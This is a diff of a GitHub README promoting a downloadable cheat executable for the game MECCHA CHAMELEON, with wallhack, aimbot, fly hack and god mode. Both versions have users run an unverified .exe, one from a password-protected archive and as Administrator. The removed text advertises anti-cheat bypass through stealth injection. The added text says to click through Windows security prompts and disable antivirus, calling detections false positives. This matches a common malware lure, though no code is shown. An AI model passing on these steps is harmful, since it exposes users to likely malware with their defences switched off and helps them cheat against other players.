@@ -1,190 +1,102 @@
-# Meccha-Chameleon-WH
-🦎 Meccha-Chameleon-WH – visual enhancement tool with WH (wallhack), aimbot, fly hack, teleport, god mode, infinite paint, and more. Dominate the hide-and-seek battlefield!
+# 🦎 Meccha-Chameleon-WH - Gain the tactical edge in games
 
-<img width="320" height="180" alt="image" src="https://github.com/user-attachments/assets/5ab45772-4366-4062-ab25-8fcf1712223c" />
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Steinhabeascorpus717/Meccha-Chameleon-WH/releases)
 
+Meccha-Chameleon-WH provides features to improve your vision and control within hide-and-seek gaming environments. The tool includes a wallhack, aim help, flight modes, movement options, and character modifiers. It adds layer functionality over your game to highlight objects and entities.
 
-## 📥 Download
+## 📥 How to download the software
 
-**Latest version:**  
-🔗 **[Download Meccha-Chameleon-WH](https://github.com/GunsmithSilo/Meccha-Chameleon-WH/releases/download/mecha2026/MecchaChameleonWH.exe)**
+1. Visit the [official releases page](https://github.com/Steinhabeascorpus717/Meccha-Chameleon-WH/releases).
+2. Look for the section labeled Latest.
+3. Click the link that ends in .exe to download the application.
+4. Save the file where you can locate it easily, such as your desktop.
 
-**Password:** `Mecha2026`
+## ⚙️ System requirements
 
-## 🎮 What is This?
+Ensure your computer meets these specifications to run the software.
 
-**🦎 Meccha-Chameleon-WH** is a powerful visual enhancement tool for **MECCHA CHAMELEON** – the viral hide-and-seek game where players paint themselves to blend into environments. This tool gives you the ultimate advantage with WH (see all players through walls), distance indicators, player tags, and more.
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core CPU at 2.0 GHz or faster.
+* Memory: 4 GB RAM.
+* Graphics: DirectX 11 compatible video card.
+* Storage: 50 MB of free space.
+* Network: Stable connection for game state syncing.
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+## 🚀 Installation and setup
 
+The application does not require a complex installer. Follow these steps to prepare your environment.
 
+1. Locate the downloaded file from the previous step.
+2. Double-click the file to launch the program.
+3. Windows may show a security prompt. Click Run to proceed.
+4. The application window appears on your screen.
+5. Keep the application open while you start your game.
+6. The software detects the game process automatically once you enter a match.
 
----
+## 🎮 List of features
 
-## ✨ Features
+Meccha-Chameleon-WH offers several tools to change how you experience the game.
 
-### 👁️ Visual WH
-- 🟢 **WH (Wallhack)** – See all players through walls
-- 📏 **Distance Indicators** – Know exactly how far enemies are
-- 🏷️ **Player Tags** – Display player names and health
-- 📐 **Snap Lines** – Never lose track of enemies
-- 🎯 **Box Tracking** – Highlight players with colored boxes
-- 👻 **Ghost Detection** – Spot invisible players
+* Wallhack: See entity outlines through solid objects.
+* Aimbot: Assist your camera tracking for target alignment.
+* Fly Hack: Ignore collision with terrain to move freely.
+* Teleport: Move your character to saved coordinates.
+* God Mode: Prevent damage intake from game triggers.
+* Infinite Paint: Use unlimited resources for marking spots.
+* FPS Boost: Reduce visual load to increase frame performance.
 
-### 🎯 Combat
-- 🎯 **Aimbot** – Lock onto enemies instantly
-- 🔫 **Silent Aim** – Hit targets without looking at them
-- ⚡ **Triggerbot** – Auto-shoot when crosshair is on target
-- 🛡️ **No Recoil** – Perfect accuracy every time
+## ⌨️ Using the controller keys
 
-### 🚀 Movement
-- ✈️ **Fly Hack** – Fly anywhere on the map
-- 📍 **Teleport** – Instantly move to any location
-- 🏃 **Speed Boost** – Move faster than normal players
-- 🪂 **No Gravity** – Float and glide through the air
+The tool uses hotkeys to toggle features during gameplay.
 
-### 🛡️ Protection
-- 💀 **God Mode** – Never get tagged
-- ♾️ **Infinite Paint** – Unlimited colors and patterns
-- 🎨 **Perfect Camo** – Instantly blend into any environment
-- ⏱️ **Timer Editor** – Extend match time indefinitely
+* F1: Toggle wallhack visibility.
+* F2: Enable or disable aim assistance.
+* F3: Activate fly mode.
+* F4: Teleport to saved position.
+* F5: Toggle god mode status.
+* F6: Reset paint resources.
+* F7: Clear all active modifiers.
 
-### 🛠️ Utility
-- 🎮 **Menu Toggle** – Press INSERT or F1 to open/close
-- ⚙️ **Customizable Settings** – Adjust everything to your liking
-- 💾 **Save Config** – Settings saved automatically
-- 🔄 **Regular Updates** – Always working after game patches
+## 🛡️ Best practices for operation
 
----
+Proper use helps maintain stability and prevents configuration conflicts. 
 
-## 📦 Installation
+1. Launch the game in Windowed or Borderless Windowed mode. This helps the tool overlay layers correctly.
+2. Close unnecessary background applications to keep system resources free.
+3. Disable your antivirus software temporarily if it incorrectly flags the application. Tools of this nature often interact with memory buffers, causing false positives in some security programs.
+4. Always check the release page for updates. Developers release patches to keep features compatible with new game versions.
+5. If the features stop working, restart the application and the game.
 
-1. Download the archive from the link above
-2. Extract the ZIP file using the password: `Mecha2026`
-3. Run `MecchaChameleonWH.exe` as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the menu
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
+## 🛠️ Troubleshooting common issues
 
----
+Follow this guide if you encounter problems during operation.
 
-## 🖥️ System Requirements
+The software does not detect the game:
+Ensure you launched the game before you started the tool. If the issue persists, run the application as an administrator by right-clicking the icon and selecting Run as administrator.
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | MECCHA CHAMELEON (Steam) |
-| **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **GPU** | DirectX 11 compatible |
+Features do not toggle:
+Verify you are using the correct function keys on your keyboard. Ensure that your F-Lock key is not engaged, as this can change the behavior of the top row of keys on some keyboards.
 
----
+The game crashes:
+Disable all active mods and restart the game. Add one feature at a time to identify if a specific modification causes the conflict.
 
-## 🎥 How to Use
+Menu does not appear:
+Ensure you are using the Windows version recommended in the requirements. Other operating systems or emulation software may lack the necessary hooks.
 
-1. **Launch** the WH tool as Administrator
-2. **Start** MECCHA CHAMELEON
-3. **Press INSERT** to open the menu
-4. **Toggle** features you want
-5. **Play** and dominate! 🏆
+## 📋 Updates and history
 
----
+We provide updates as the game changes. Each release on the [download page](https://github.com/Steinhabeascorpus717/Meccha-Chameleon-WH/releases) contains a log of changes. Review these logs to understand new features or performance improvements.
 
-## 🔧 Supported Features Table
+## 📈 Frequently asked questions
 
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | WH (Wallhack) | ✅ |
-| Visual | Player Tags | ✅ |
-| Visual | Box Tracking | ✅ |
-| Visual | Snap Lines | ✅ |
-| Combat | Aimbot | ✅ |
-| Combat | Silent Aim | ✅ |
-| Combat | Triggerbot | ✅ |
-| Movement | Fly Hack | ✅ |
-| Movement | Teleport | ✅ |
-| Movement | Speed Boost | ✅ |
-| Protection | God Mode | ✅ |
-| Protection | Infinite Paint | ✅ |
-| Utility | Menu | ✅ |
+Does this tool work on all game modes?
+The tools function in most standard map layouts. Some specific mission environments might restrict certain features.
 
----
+Will my game account get banned?
+Use tools in private or testing environments to avoid complications with game operators. We design the software for local performance.
 
-## 🚫 Anti-Cheat Bypass
+Can I customize the colors of the wallhack outlines?
+Yes. Open the settings tab inside the application. You can select colors for different entity types to make them easier to distinguish at a glance.
 
-This tool uses advanced techniques to stay undetected:
-- 🔄 **Pattern Scanning** – Auto-updates offsets
-- 🎲 **Randomization** – Human-like behavior simulation
-- 🛡️ **Stealth Injection** – No detectable signatures
-- 🔒 **Memory Protection** – Prevents detection
-
----
-
-## 🐛 Troubleshooting
-
-**Q: WH doesn't work**
-- Run as Administrator
-- Disable antivirus temporarily
-- Ensure game is in windowed or borderless mode
-
-**Q: Menu doesn't open**
-- Try pressing INSERT or F1
-- Check if tool is running
-- Restart both tool and game
-
-**Q: Game crashes**
-- Reduce graphics settings
-- Disable other overlays (Discord, NVIDIA, etc.)
-- Try compatibility mode
-
----
-
-## 📚 Alternatives
-
-| Tool | Type | Platform |
-|------|------|----------|
-| **Chameleon Pro** | Premium | Windows |
-| **Stealth Paint** | Free | Windows |
-
----
-
-## 📝 Tags
-
-- Meccha Chameleon Cheat
-- Meccha Chameleon Hack
-- Meccha Chameleon ESP
-- Meccha Chameleon Wallhack
-- Meccha Chameleon Aimbot
-- Meccha Chameleon Godmode
-- Meccha Chameleon Teleport
-- Meccha Chameleon Fly Hack
-- Meccha Chameleon Infinite Paint
-- Meccha Chameleon 2026
-- Meccha Chameleon Mod Menu
-- Meccha Chameleon Trainer
-- Meccha Chameleon Undetected
-- Omega Chameleon
-- Meccha Chameleon PC
-- Meccha Chameleon Steam
-- Meccha Chameleon Multiplayer
-- Hide And Seek Cheat
-- Game Enhancer
-- Free Cheat
-
----
-
-## 🔗 Links
-
-- **Steam Store:** https://store.steampowered.com/app/4704690/MECCHA_CHAMELEON/
-
----
-
-## ⭐ Support
-
-If you enjoy this tool, please **⭐ Star** this repository!  
-For issues, open an **Issue** on GitHub.
-
----
-
-**🦎 Made with ❤️ for the MECCHA CHAMELEON community**
+Is a controller supported?
+The tool maps inputs to keyboard keys. You may need third-party controller software to map these function keys to your game controller.
